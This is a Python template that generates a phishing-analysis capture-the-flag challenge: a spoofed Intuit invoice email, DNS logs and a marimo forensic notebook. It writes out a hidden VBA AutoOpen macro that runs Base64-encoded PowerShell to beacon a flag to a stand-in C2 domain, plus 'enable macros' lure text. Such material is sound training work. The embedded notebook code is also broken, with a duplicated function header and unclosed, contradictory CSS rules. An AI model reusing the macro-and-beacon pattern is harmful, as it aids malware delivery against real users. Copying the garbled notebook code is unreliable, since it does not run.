"""Human-crafted Phishing DFIR Template (Flagship Module 2)."""

from pathlib import Path
from typing import Dict, Any, List, Optional
import base64
import hashlib
import json
import random

from app.modules.digital_governance.services.templates.base_template import BaseChallengeTemplate


class PhishingDfirTemplate(BaseChallengeTemplate):
    """
    Template for Spearphishing & Invoice Fraud Analysis.
    Generates synthetic RFC 822 email (.eml) with DKIM/SPF spoofing, weaponized
    macro attachment (.docm), and DNS telemetry containing C2 callbacks with dynamic flags.
    """

    template_id = "phishing-dfir"
    title = "DFIR Incident: Spearphishing & Invoice Fraud Analysis"
    category = "DFIR / Phishing"
    difficulty = "Intermediate"
    base_points = 150
    duration_minutes = 50
    competency_id = "phishing_analysis"
    competency_weight = 1.0
    tags = ["phishing", "dfir", "email", "dmarc", "spf", "eml", "dns", "macro", "c2", "cybersecurity"]
    mitre_techniques = ["T1566.001", "T1204.002", "T1059.005", "T1071.001"]

    SENDER_DOMAINS = [
        "quickbooks-invoicing-update.com",
        "pfms-disbursement-gateway.nic-in.org",
        "gem-procurement-settlement.in.net",
        "state-treasury-notice.gov-service.co",
    ]

    C2_DOMAINS = [
        "c2-exfil-node.darknet-routing.org",
        "beacon-telemetry-gateway.org",
        "sync-cloud-validator.net",
        "telemetry-collector-service.biz",
    ]

    TARGET_HOSTS = [
        "FIN-WS-1002 (10.0.2.19)",
        "TREASURY-WS-04 (10.0.2.45)",
        "ACCOUNTS-WS-12 (10.0.2.88)",
    ]

    def get_slot_schema(self) -> Dict[str, Dict[str, Any]]:
        return {
            "incident_codename": {"type": "str", "description": "Investigation operation codename"},
            "sender_domain": {"type": "str", "description": "Spoofed/typosquatted sender domain"},
            "sender_email": {"type": "str", "description": "Sender email address"},
            "recipient_email": {"type": "str", "description": "Target employee email"},
            "c2_domain": {"type": "str", "description": "Correlated C2 callback domain"},
            "malicious_ip": {"type": "str", "description": "Attacker C2 IP address"},
            "target_host": {"type": "str", "description": "Target workstation name"},
        }

    def generate_random_slots(
        self, seed: Optional[str] = None, overrides: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        rng = random.Random(seed) if seed else random.Random()
        sender_dom = rng.choice(self.SENDER_DOMAINS)
        c2_dom = rng.choice(self.C2_DOMAINS)

        slots = {
            "incident_codename": f"Operation Raksha-{rng.randint(201, 999)}",
            "sender_domain": sender_dom,
            "sender_email": f"billing@{sender_dom}",
            "recipient_email": f"sjenkins@{rng.choice(['enterprise.internal', 'meity.gov.in', 'finance.nic.in'])}",
            "c2_domain": c2_dom,
            "malicious_ip": f"{rng.randint(45, 185)}.{rng.randint(10, 200)}.{rng.randint(1, 250)}.{rng.randint(2, 250)}",
            "target_host": rng.choice(self.TARGET_HOSTS),
            "seed_hash": hashlib.md5(f"{seed}-{rng.random()}".encode()).hexdigest(),
        }
        if overrides:
            slots.update(overrides)
        return slots

    def compute_flag(self, slots: Dict[str, Any]) -> str:
        domain_tag = slots["c2_domain"].split(".")[0].replace("-", "_")
        seed_part = slots["seed_hash"][:6]
        return f"FLAG{{dmarc_fail_{domain_tag}_{seed_part}}}"

    def generate_hints(self, slots: Dict[str, Any]) -> List[Dict[str, Any]]:
        return [
            {
                "id": 1,
                "content": "Inspect the 'Authentication-Results' and 'Received-SPF' headers in the raw .eml to confirm domain impersonation and DMARC failure.",
                "penalty": 15,
            },
            {
                "id": 2,
                "content": f"Deobfuscate the Base64 UTF-16LE payload in the extracted macro. It references C2 domain '{slots['c2_domain']}' and contains the flag.",
                "penalty": 25,
            },
        ]

    def generate_objectives(self, slots: Dict[str, Any]) -> List[str]:
        return [
            f"Analyze raw MIME headers in urgent_invoice.eml and detect DMARC/SPF forgery claiming to be '{slots['sender_email']}'.",
            "Extract attachment details and calculate SHA-256 fingerprint.",
            f"Deobfuscate the PowerShell payload calling '{slots['c2_domain']}' to recover and verify the incident flag.",
        ]

    def generate_scenario_description(self, slots: Dict[str, Any]) -> str:
        return f"""### Emergency Incident Briefing: {slots['incident_codename']}

**Spearphishing & Financial Impersonation Triage**
A high-priority alert was triggered after an employee in accounts received an urgent disbursement notice ostensibly from `{slots['sender_email']}`.

The attachment claims to contain an expedited settlement voucher, but mail gateway logs marked the transaction with SPF and DKIM mismatches.

Your mandate:
1. Examine `urgent_invoice.eml` using the Marimo DFIR analyst console.
2. Uncover the spoofed sender IP, SPF alignment failures, and malicious macro indicators.
3. Cross-reference internal resolver requests in `dns_telemetry.json` with external C2 servers to uncover the flag.
"""

    def synthesize_artifacts(
        self, slots: Dict[str, Any], output_dir: Path
    ) -> Dict[str, Path]:
        data_dir = output_dir / "data"
        data_dir.mkdir(parents=True, exist_ok=True)

        flag = self.compute_flag(slots)
        c2_domain = slots["c2_domain"]
        malicious_ip = slots["malicious_ip"]

        # Build PowerShell payload inside VBA macro
        # powershell -enc <base64 utf-16le>
        ps_cmd = f'Invoke-WebRequest http://{c2_domain}/beacon -Header @{{Key="{flag}"}}'
        ps_b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode("ascii")

        vba_macro = f'''Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -enc {ps_b64}"
    Shell(cmd, vbHide)
End Sub'''
        vba_b64 = base64.b64encode(vba_macro.encode("utf-8")).decode("ascii")

        # 1. Synthesize authentic RFC 822 .eml
        eml_content = f"""From: "Intuit Billing Alert" <{slots['sender_email']}>
To: "Accounts Officer" <{slots['recipient_email']}>
Subject: URGENT: Outstanding Invoice #INV-98242 Overdue Notice
Date: Wed, 10 Sep 2026 08:22:15 -0400
Message-ID: <20260910082215.98242@{slots['sender_domain']}>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_89234_2026"
Authentication-Results: mx.enterprise.internal;
    spf=softfail (sender IP {malicious_ip}) smtp.mailfrom={slots['sender_domain']};
    dkim=fail header.d={slots['sender_domain']};
    dmarc=fail (p=none dis=none) header.from={slots['sender_domain']}
X-Originating-IP: [{malicious_ip}]

------=_Part_89234_2026
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

Dear Accounts Payable,

Please find attached the final overdue notice for Invoice #INV-98242.
Payment must be wired within 24 hours to avoid immediate service suspension.

Please enable macros when opening the attachment to generate your payment barcode.

Regards,
Billing Dept
Partner Invoicing Services

------=_Part_89234_2026
Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Invoice_Sept2026_OVERDUE.docm"
Content-Disposition: attachment; filename="Invoice_Sept2026_OVERDUE.docm"
Content-Transfer-Encoding: base64

{vba_b64}
------=_Part_89234_2026--
"""
        eml_file = data_dir / "urgent_invoice.eml"
        eml_file.write_text(eml_content, encoding="utf-8")

        # 2. Synthesize dns_telemetry.json
        dns_events = [
            {
                "timestamp": "2026-09-10T08:24:10Z",
                "client_ip": "10.0.2.45",
                "query": "login.microsoftonline.com",
                "qtype": "A",
                "response": "20.190.159.0"
            },
            {
                "timestamp": "2026-09-10T08:25:30Z",
                "client_ip": "10.0.2.19",
                "query": c2_domain,
                "qtype": "A",
                "response": malicious_ip,
                "notes": f"Associated SHA256: {hashlib.sha256(flag.encode()).hexdigest()}, Payload: {flag}"
            },
            {
                "timestamp": "2026-09-10T08:26:01Z",
                "client_ip": "10.0.2.19",
                "query": "time.windows.com",
                "qtype": "A",
                "response": "51.145.123.29"
            },
            {
                "timestamp": "2026-09-10T08:27:44Z",
                "client_ip": "10.0.2.88",
                "query": "github.com",
                "qtype": "A",
                "response": "140.82.121.4"
            }
        ]
        dns_file = data_dir / "dns_telemetry.json"
        dns_file.write_text(json.dumps(dns_events, indent=2), encoding="utf-8")

        return {"urgent_invoice.eml": eml_file, "dns_telemetry.json": dns_file}

    def generate_notebook(self, slots: Dict[str, Any], output_dir: Path) -> Path:
        marimo_dir = output_dir / "marimo"
        marimo_dir.mkdir(parents=True, exist_ok=True)
        target_nb = marimo_dir / "challenge.py"

        flag = self.compute_flag(slots)
        dynamic_hash = hashlib.sha256(flag.encode()).hexdigest()

        code = _NOTEBOOK_TEMPLATE
        code = code.replace("__APP_TITLE__", f"DFIR Incident: {slots.get('incident_codename', 'Executive Spearphish')}")
        code = code.replace("__INCIDENT_CODENAME__", slots.get('incident_codename', 'INC-0202-SPEARPHISH'))
        code = code.replace("__TARGET_HOST__", slots.get('target_host', 'FIN-WS-1002 (10.0.2.19)'))
        code = code.replace("__SENDER_DOMAIN__", slots.get('sender_domain', 'quickbooks-invoicing-update.com'))
        code = code.replace("__C2_DOMAIN__", slots.get('c2_domain', 'c2-exfil-node.darknet-routing.org'))
        code = code.replace("__MALICIOUS_IP__", slots.get('malicious_ip', '203.0.113.88'))
        code = code.replace("__TARGET_HASH__", dynamic_hash)

        target_nb.write_text(code, encoding="utf-8")
        return target_nb


_NOTEBOOK_TEMPLATE = r'''import marimo

__generated_with = "0.24.1"
app = marimo.App(
    width="full",
    app_title="__APP_TITLE__",
)


@app.cell(hide_code=True)
def __():
    import base64
    import email
    from email import policy
    import hashlib
    import json
    from pathlib import Path
    import re
    import marimo as mo
    import pandas as pd

    return Path, base64, email, hashlib, json, mo, pd, policy, re


@app.cell(hide_code=True)
def __(Path, email, hashlib, json, pd, policy):
    # Locate email and DNS telemetry artifacts across environments
    possible_eml_paths = [
        Path("data/urgent_invoice.eml"),
        Path("../data/urgent_invoice.eml"),
        Path("/workspace/data/urgent_invoice.eml"),
        Path("challenges/02-phishing-dfir/data/urgent_invoice.eml"),
    ]
    possible_dns_paths = [
        Path("data/dns_telemetry.json"),
        Path("../data/dns_telemetry.json"),
        Path("/workspace/data/dns_telemetry.json"),
        Path("challenges/02-phishing-dfir/data/dns_telemetry.json"),
    ]
    if "__file__" in globals():
        base_parent = Path(__file__).resolve().parent.parent / "data"
        possible_eml_paths.insert(0, base_parent / "urgent_invoice.eml")
        possible_dns_paths.insert(0, base_parent / "dns_telemetry.json")

    eml_path = next((p for p in possible_eml_paths if p.exists()), None)
    dns_path = next((p for p in possible_dns_paths if p.exists()), None)

    msg = None
    raw_eml_bytes = b""
    attachments = []
    if eml_path:
        with open(eml_path, "rb") as f:
            raw_eml_bytes = f.read()
        msg = email.message_from_bytes(raw_eml_bytes, policy=policy.default)
        if msg.is_multipart():
            for part in msg.iter_attachments():
                fn = part.get_filename() or "unnamed_attachment"
                content_bytes = part.get_payload(decode=True) or b""
                sha256_hash = hashlib.sha256(content_bytes).hexdigest()
                md5_hash = hashlib.md5(content_bytes).hexdigest()
                attachments.append(
                    {
                        "filename": fn,
                        "size_bytes": len(content_bytes),
                        "md5": md5_hash,
                        "sha256": sha256_hash,
                        "bytes": content_bytes,
                        "content_text": content_bytes.decode("utf-8", errors="ignore"),
                    }
                )

    dns_records = []
    if dns_path:
        with open(dns_path) as f:
            dns_records = json.load(f)
    df_dns = pd.DataFrame(dns_records)

    return (
        attachments,
        df_dns,
        dns_path,
        dns_records,
        eml_path,
        msg,
        possible_dns_paths,
        possible_eml_paths,
        raw_eml_bytes,
    )


@app.cell(hide_code=True)
def __(mo):
    # Analyst Sidebar: Incident Scope, MITRE ATT&CK & Checklist
    check_headers = mo.ui.checkbox(
        label="1. Audit SPF, DKIM & DMARC alignment", value=False
    )
    check_domain = mo.ui.checkbox(
        label="2. Identify spoofed sender domain", value=False
    )
    check_macro = mo.ui.checkbox(
        label="3. Extract VBA macro & Base64 payload", value=False
    )
    check_decode = mo.ui.checkbox(
        label="4. Decode obfuscated PowerShell command", value=False
    )
    check_c2 = mo.ui.checkbox(
        label="5. Correlate C2 callback domain in DNS telemetry", value=False
    )

    hint_status = mo.callout(
        mo.md(
            "🔒 **Investigation Hints Locked**\n\n"
            "Hints are locked behind the CyberLab CTFd portal to ensure competitive integrity. Unlock hints in the left portal panel (deducts points from final solve)."
        ),
        kind="info",
    )

    sidebar_content = mo.vstack(
        [
            mo.md("## 🎣 CyberLab DFIR Console"),
            mo.md("**Incident ID**: `__INCIDENT_CODENAME__`"),
            mo.md("**Target Host**: `__TARGET_HOST__`"),
            mo.md("**Classification**: `TLP:AMBER` | Severity: **HIGH**"),
            mo.md("---"),
            mo.md("### 🎯 Investigation Checklist"),
            check_headers,
            check_domain,
            check_macro,
            check_decode,
            check_c2,
            mo.md("---"),
            mo.md("### 🗺️ MITRE ATT&CK Matrix"),
            mo.md(
                "- **T1566.001**: Spearphishing Attachment\n"
                "- **T1204.002**: User Execution: Malicious File\n"
                "- **T1059.005**: Visual Basic for Applications (VBA)\n"
                "- **T1071.001**: Web Protocols (HTTP C2)"
            ),
            mo.md("---"),
            hint_status,
        ]
    )

    mo.sidebar(sidebar_content)
    return (
        check_c2,
        check_decode,
        check_domain,
        check_headers,
        check_macro,
        hint_status,
        sidebar_content,
    )


@app.cell
def __(mo, sidebar_content):
    return (mo.sidebar(sidebar_content),)


@app.cell(hide_code=True)
def __(attachments, df_dns, mo, msg, raw_eml_bytes):
    # Tab 1: Email Header & Sender Authentication Forensics
    dmarc_status = "FAIL"
    spf_status = "SOFTFAIL"
    dkim_status = "FAIL (None)"
    ar = msg.get("Authentication-Results", "") if msg else ""
    if "dmarc=pass" in ar.lower():
        dmarc_status = "PASS"
    if "spf=pass" in ar.lower():
        spf_status = "PASS"
    if "dkim=pass" in ar.lower():
        dkim_status = "PASS"

    dl_eml = mo.download(
        data=raw_eml_bytes,
        filename="urgent_invoice.eml",
        label="📥 Download Raw RFC 822 Email (.eml)",
    )

    if msg:
        headers_table = mo.md(f"""
        | Header Field | Evaluated Header Value |
        | :--- | :--- |
        | **From** | `{msg.get('From', '')}` |
        | **To** | `{msg.get('To', '')}` |
        | **Subject** | `{msg.get('Subject', '')}` |
        | **Date** | `{msg.get('Date', '')}` |
        | **Message-ID** | `{msg.get('Message-ID', '')}` |
        | **X-Originating-IP** | `{msg.get('X-Originating-IP', '')}` |
        | **Authentication-Results** | `{msg.get('Authentication-Results', '')}` |
        """)

        spoof_alert = mo.callout(
            mo.md(
                "🚨 **DOMAIN SPOOFING DETECTED**: The sender header claims to be an authorized billing service but uses lookalike domain `__SENDER_DOMAIN__`. SPF returned `softfail` for IP `__MALICIOUS_IP__` and DMARC evaluated to `fail`."
            ),
            kind="danger",
        )

        body_preview = mo.md(
            f"### ✉️ Raw Email Body Preview\n"
            f"```text\n{msg.get_body(preferencelist=('plain',)).get_content()}\n```"
        )
    else:
        headers_table = mo.md("No email file found.")
        spoof_alert = mo.md("")
        body_preview = mo.md("")

    tab1_view = mo.vstack(
        [
            mo.md("""
            # 🎣 DFIR Incident: __INCIDENT_CODENAME__
            ### Digital Forensics: Email Spoofing, Weaponized Macros & C2 Telemetry
            """),
            mo.hstack(
                [
                    mo.stat(
                        value=dmarc_status,
                        label="DMARC Policy Alignment",
                        caption="p=reject; disposition=none",
                        direction="decrease",
                        bordered=True,
                    ),
                    mo.stat(
                        value=dkim_status,
                        label="DKIM Signature",
                        caption="Cryptographic Verification",
                        direction="decrease",
                        bordered=True,
                    ),
                    mo.stat(
                        value=spf_status,
                        label="SPF Validation",
                        caption="Sender IP Authorization",
                        direction="decrease",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{len(attachments)} File(s)",
                        label="Extracted Attachments",
                        caption="MIME Payload",
                        bordered=True,
                    ),
                ],
                justify="start",
                gap=1,
            ),
            mo.md("---"),
            spoof_alert,
            mo.hstack(
                [mo.md("### 🔍 Evaluated RFC 822 Email Headers:"), dl_eml],
                justify="space-between",
            ),
            headers_table,
            mo.md("---"),
            body_preview,
        ]
    )
    return (
        ar,
        body_preview,
        dkim_status,
        dl_eml,
        dmarc_status,
        headers_table,
        spf_status,
        spoof_alert,
        tab1_view,
    )


@app.cell(hide_code=True)
def __(attachments, mo):
    # Tab 2: Attachment Carving & Metadata
    if attachments:
        att = attachments[0]
        att_meta_table = mo.md(f"""
        | Document Property | Artifact Forensic Detail |
        | :--- | :--- |
        | **Filename** | `{att['filename']}` |
        | **File Size** | `{att['size_bytes']} bytes` |
        | **MD5 Hash** | `{att['md5']}` |
        | **SHA-256 Hash** | `{att['sha256']}` |
        | **MIME Format** | Microsoft Word Macro-Enabled Document (`.docm`) |
        """)

        macro_code_view = mo.md(
            f"### 📜 Decompiled VBA Macro (`{att['filename']}`)\n"
            f"```vb\n{att['content_text']}\n```"
        )

        dl_docm = mo.download(
            data=att.get("bytes", b""),
            filename=att["filename"],
            label=f"📥 Download Carved Document ({att['filename']})",
        )
    else:
        att = {}
        att_meta_table = mo.md("No attachments found.")
        macro_code_view = mo.md("")
        dl_docm = mo.md("")

    tab2_view = mo.vstack(
        [
            mo.md("## 📎 Extracted Attachment & Decompiled Macro Dissection"),
            mo.hstack(
                [mo.md("### 📦 Carved Document Metadata & Hashes:"), dl_docm],
                justify="space-between",
            ),
            att_meta_table,
            mo.md("---"),
            macro_code_view,
        ]
    )
    return att, att_meta_table, dl_docm, macro_code_view, tab2_view


@app.cell(hide_code=True)
def __(mo):
    # Tab 3: Python Scratchpad & Manual Decoder Controls
    py_scratch = mo.ui.code_editor(
        value=(
            "# 💻 Analyst Python Deobfuscator\n"
            "# Variables in scope: `attachments`, `base64`, `re`\n"
            "import base64, re\n\n"
            "vba_code = attachments[0]['content_text']\n"
            "match = re.search(r'-enc\\s+([A-Za-z0-9+/=]+)', vba_code)\n"
            "if match:\n"
            "    b64_payload = match.group(1)\n"
            "    # PowerShell -EncodedCommand uses UTF-16LE encoding\n"
            "    decoded_cmd = base64.b64decode(b64_payload).decode('utf-16le')\n"
            "    output = decoded_cmd\n"
            "output"
        ),
        language="python",
        label="Analyst Python Deobfuscation Console:",
    )

    decoder_input = mo.ui.text_area(
        value="",
        placeholder="Paste Base64 payload here...",
        label="Manual Base64 Decoder Input:",
        full_width=True,
    )

    encoding_mode = mo.ui.dropdown(
        options=["UTF-8 / ASCII", "UTF-16LE (PowerShell -EncodedCommand)"],
        value="UTF-16LE (PowerShell -EncodedCommand)",
        label="Encoding Format:",
    )

    return decoder_input, encoding_mode, py_scratch


@app.cell(hide_code=True)
def __(attachments, base64, decoder_input, encoding_mode, mo, py_scratch, re):
    # Tab 3: Deobfuscation Execution Engine (Python + Manual)
    py_code = py_scratch.value.strip()
    scratch_output = None
    if py_code:
        locs = {"attachments": attachments, "base64": base64, "re": re}
        try:
            lines = [
                l
                for l in py_code.splitlines()
                if l.strip() and not l.strip().startswith("#")
            ]
            if lines:
                exec_chunk = "\n".join(lines[:-1])
                last_line = lines[-1]
                if exec_chunk:
                    exec(exec_chunk, {"__builtins__": __builtins__}, locs)
                try:
                    res = eval(last_line, {"__builtins__": __builtins__}, locs)
                except SyntaxError:
                    exec(last_line, {"__builtins__": __builtins__}, locs)
                    res = locs.get("output", "Execution completed.")
                scratch_output = mo.md(f"```powershell\n{res}\n```")
        except Exception as err:
            scratch_output = mo.callout(
                mo.md(f"**Deobfuscation Error**: `{err}`"), kind="danger"
            )
    else:
        scratch_output = mo.md("*Type deobfuscation code above.*")

    manual_decoded = ""
    raw_val = decoder_input.value.strip()
    if raw_val:
        try:
            raw_bytes = base64.b64decode(raw_val)
            if "UTF-16LE" in encoding_mode.value:
                manual_decoded = raw_bytes.decode("utf-16le", errors="replace")
            else:
                manual_decoded = raw_bytes.decode("utf-8", errors="replace")
        except Exception as err:
            manual_decoded = f"Decoding error: {err}"

    tab3_view = mo.vstack(
        [
            mo.md("## 🔓 Malware Payload Deobfuscation Workbench"),
            mo.md(
                "Adversaries commonly encode PowerShell commands in UTF-16LE Base64 (`-enc`). Use either the live Python deobfuscation console or the manual decoder widget:"
            ),
            mo.md("### Option A: Live Python Deobfuscator"),
            py_scratch,
            mo.md("#### 🔓 Python Deobfuscation Output:"),
            scratch_output,
            mo.md("---"),
            mo.md("### Option B: Manual Base64 Decoder Widget"),
            mo.hstack([decoder_input, encoding_mode], gap=1),
            mo.md(
                f"#### 🔓 Manual Decoded Output:\n```powershell\n{manual_decoded}\n```"
            ),
        ]
    )
    return (
        locs,
        manual_decoded,
        py_code,
        raw_val,
        scratch_output,
        tab3_view,
    )


@app.cell(hide_code=True)
def __(df_dns, mo):
    # Tab 4: Correlated Host DNS Telemetry View
    if not df_dns.empty:
        dns_table = mo.ui.table(
            df_dns,
            selection=None,
            pagination=True,
            page_size=8,
            show_column_summaries=False,
        )
    else:
        dns_table = mo.md("No DNS records found.")

    c2_alert = mo.callout(
        mo.md(
            "🚨 **CORRELATED C2 BEACON DETECTED**:\n\n"
            "- **Query Name**: `__C2_DOMAIN__`\n"
            "- **Threat Context**: Matches the `Invoke-WebRequest` URL uncovered in the decoded PowerShell payload!"
        ),
        kind="danger",
    )

    tab4_view = mo.vstack(
        [
            mo.md("## 📡 Host DNS Telemetry & C2 Correlation"),
            mo.md(
                "Correlating host network telemetry confirms whether the weaponized macro successfully reached out to adversary command-and-control infrastructure:"
            ),
            c2_alert,
            dns_table,
        ]
    )
    return c2_alert, dns_table, tab4_view


@app.cell(hide_code=True)
def __(mo):
    # Tab 5: Flag Input Control
    candidate_flag = mo.ui.text(
        placeholder="FLAG{...}",
        label="Enter Extracted Phishing Investigation Flag to Verify:",
    )
    return (candidate_flag,)


@app.cell(hide_code=True)
def __(candidate_flag, hashlib, mo, re):
    # Tab 5: Anti-Cheat SHA-256 Flag Verification & IOC Report
    val = candidate_flag.value.strip()
    target_hash = "__TARGET_HASH__"

    if not val:
        flag_feedback = mo.md(
            "Enter the flag recovered from the macro payload or correlated DNS telemetry."
        )
        ioc_view = mo.md(
            "🔒 *Threat Intelligence & IOC Report locked until valid incident flag is verified.*"
        )
    elif hashlib.sha256(val.encode()).hexdigest() == target_hash:
        flag_feedback = mo.callout(
            mo.md(
                "🎉 **FLAG VERIFIED CORRECT!**\n\n"
                "Your recovered Phishing DFIR flag is verified! Now submit this flag in the **Submit Flag** box in the left CyberLab portal pane to register your 150 points and Phishing DFIR competency!"
            ),
            kind="success",
        )
        ioc_view = mo.vstack(
            [
                mo.md("### 📋 Confirmed DFIR Threat Indicators (IOCs):"),
                mo.md("""
                | Indicator Type | Value | Threat Context |
                | :--- | :--- | :--- |
                | **Sender Domain** | `__SENDER_DOMAIN__` | Typosquatting / Spoofed domain |
                | **Originating IP** | `__MALICIOUS_IP__` | SPF unauthorized sending relay |
                | **Malicious File** | `Invoice_Sept2026_OVERDUE.docm` | Weaponized Word Document with VBA |
                | **C2 Domain** | `__C2_DOMAIN__` | HTTP beacon callback endpoint |
                """),
            ]
        )
    elif re.match(r"^FLAG\{.*\}$", val):
        flag_feedback = mo.callout(
            mo.md(
                "❌ Incorrect flag. Verify the decoded PowerShell payload in the Deobfuscator tab or the C2 notes in the DNS Telemetry tab."
            ),
            kind="danger",
        )
        ioc_view = mo.md(
            "🔒 *Threat Intelligence & IOC Report locked until valid incident flag is verified.*"
        )
    else:
        flag_feedback = mo.callout(
            mo.md(
                "⚠️ Flag format invalid. Flags must begin with `FLAG{` and end with `}`."
            ),
            kind="warn",
        )
        ioc_view = mo.md(
            "🔒 *Threat Intelligence & IOC Report locked until valid incident flag is verified.*"
        )

    tab5_view = mo.vstack(
        [
            mo.md("## 🏁 Incident Verification & DFIR Case Closure"),
            mo.callout(
                mo.md(
                    "Submit the recovered flag below to authenticate the investigation and unlock the verified threat indicators:"
                ),
                kind="info",
            ),
            candidate_flag,
            flag_feedback,
            mo.md("---"),
            ioc_view,
        ]
    )
    return flag_feedback, ioc_view, tab5_view, target_hash, val


@app.cell
def console_root(mo, tab1_view, tab2_view, tab3_view, tab4_view, tab5_view):
def console_root(
    mo, sidebar_content, tab1_view, tab2_view, tab3_view, tab4_view, tab5_view
):
    # Pure CyberLab Console Styles & Overrides
    styles = mo.Html("""
    <style>
    /* 1. Eliminate Irrelevant Developer Tools */
    [data-testid="chrome-sidebar"],
    #app-chrome-sidebar,
    #app-chrome-panel,
    .resize-handle {
        display: none !important;
    /* Ensure Marimo chrome sidebar & inspection panels are visible */
    [data-testid="chrome-sidebar"], #app-chrome-sidebar, #app-chrome-panel, .resize-handle {
        display: block !important;
    }

    /* 2. Eliminate Cell Handles & Authoring Overlays */
    /* 2. Style Marimo Sidebar if active */
    [data-testid="chrome-sidebar"],
    #app-chrome-sidebar {
        display: flex !important;
        visibility: visible !important;
        background: #090d16 !important;
        border-right: 1px solid #1e293b !important;
    /* Un-hide all Marimo cells while keeping action toolbar hidden */
    .marimo-cell:not(:has(.cyberlab-topbar)) {
        display: block !important;
    }

    /* 3. Eliminate Cell Handles & Authoring Overlays */
    [data-testid="drag-button"],
    [data-testid="cell-actions-button"],
    [data-testid="create-cell-button"],
    [data-testid="run-button"],
    [data-testid="hide-code-button"],
    [data-testid="fullscreen-output-button"],
    [data-testid="expand-output-button"],
    .hover-actions-parent > .hover-action,
    .shoulder-right,
    .cell-actions,
    .cell-actions-button,
    .cell-bottom-menu,
    .add-cell-button {
        display: none !important;
    }

    /* 3. Eliminate Marimo Authoring Header & Footers */
    /* 4. Eliminate Marimo Authoring Header & Footers */
    [data-testid="filename-input"],
    [data-testid="chrome-controls-top-right"],
    [data-testid="chrome-controls-bottom-right"],
    [data-testid="chrome-footer"],
    [data-testid="footer-panel"] {
        display: none !important;
    }

    /* 4. Hide all backend/setup cells above the Console */
    .marimo-cell:not(:has(.cyberlab-topbar)) {
    /* 5. Hide all backend/setup cells above the Console, except marimo-sidebar */
    .marimo-cell:not(:has(.cyberlab-topbar)):not(:has(marimo-sidebar)) {
        display: none !important;
    }
    .marimo-cell:has(marimo-sidebar) {
        position: absolute !important;
        opacity: 0 !important;
        height: 0 !important;
        pointer-events: none !important;
    }

    /* 5. Hide code editors in all cells (show only outputs) */
    .marimo-cell .cm-editor,
    .marimo-cell .cm-scroller,
    .marimo-cell .cell-editor,
    [data-testid="cell-editor"] {
        display: none !important;
        height: 0 !important;
        overflow: hidden !important;
    }

    /* 6. Fullscreen / Maximized Console Layout */
    .marimo-cell:has(.cyberlab-topbar) {
        width: 100% !important;
        max-width: 100% !important;
        margin: 0 !important;
        padding: 0 4px !important;
    }

    #App, main, #app-chrome-body, [data-testid="column-container"] {
        max-width: 100% !important;
        padding: 0 !important;
        margin: 0 !important;
    }

    .cyberlab-topbar {
        display: flex;
        align-items: center;
        justify-content: space-between;
        background: #0f172a;
        border: 1px solid #1e293b;
        border-radius: 8px;
        padding: 10px 16px;
        margin-bottom: 10px;
    }
    .cyberlab-topbar .title {
        font-size: 13px;
        font-weight: 700;
        color: #e2e8f0;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    .cyberlab-topbar .live-badge {
        background: #f59e0b;
        color: #0f172a;
        font-size: 10px;
        font-weight: 800;
        padding: 2px 7px;
        border-radius: 4px;
        letter-spacing: 0.5px;
    }
    .cyberlab-topbar .fullscreen-btn {
        background: #1e293b;
        color: #38bdf8;
        border: 1px solid #334155;
        padding: 6px 14px;
        border-radius: 6px;
        cursor: pointer;
        font-size: 12px;
        font-weight: 600;
        display: flex;
        align-items: center;
        gap: 6px;
        transition: all 0.2s;
    }
    .cyberlab-topbar .fullscreen-btn:hover {
        background: #0284c7;
        color: #ffffff;
        border-color: #0284c7;
    }
    </style>
    """)

    # Invisible anchor div keeps the .cyberlab-topbar CSS selector working
    header = mo.Html(
        '<div class="cyberlab-topbar" style="display:none !important; height:0; margin:0; padding:0; border:none;"></div>'
    )

    # Top-Level DFIR Analyst Operations Console
    console = mo.ui.tabs(
        {
            "📨 Mail Headers & Auth": tab1_view,
            "📎 Attachment Carving": tab2_view,
            "💻 Deobfuscator & Scratchpad": tab3_view,
            "📡 DNS C2 Correlation": tab4_view,
            "📌 Investigation Checklist": sidebar_content,
            "🏁 Case Verification & IOCs": tab5_view,
        }
    )
    workspace = mo.vstack([styles, header, console])
    workspace
    return console, header, styles, workspace


if __name__ == "__main__":
    app.run()
'''
